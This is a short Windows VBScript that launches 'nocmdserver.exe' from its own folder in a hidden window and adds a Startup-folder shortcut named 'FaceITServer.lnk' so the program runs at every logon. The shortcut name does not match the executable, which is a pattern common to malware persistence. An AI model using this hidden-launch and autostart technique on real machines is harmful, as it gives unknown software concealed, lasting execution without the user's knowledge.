Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)

serverPath = currentFolder & "\nocmdserver.exe"

WshShell.Run Chr(34) & serverPath & Chr(34), 0

startupFolder = WshShell.SpecialFolders("Startup")
shortcutPath = startupFolder & "\FaceITServer.lnk"

If Not fso.FileExists(shortcutPath) Then
    Set shortcut = WshShell.CreateShortcut(shortcutPath)
    shortcut.TargetPath = serverPath
    shortcut.WorkingDirectory = currentFolder
    shortcut.Save
End If
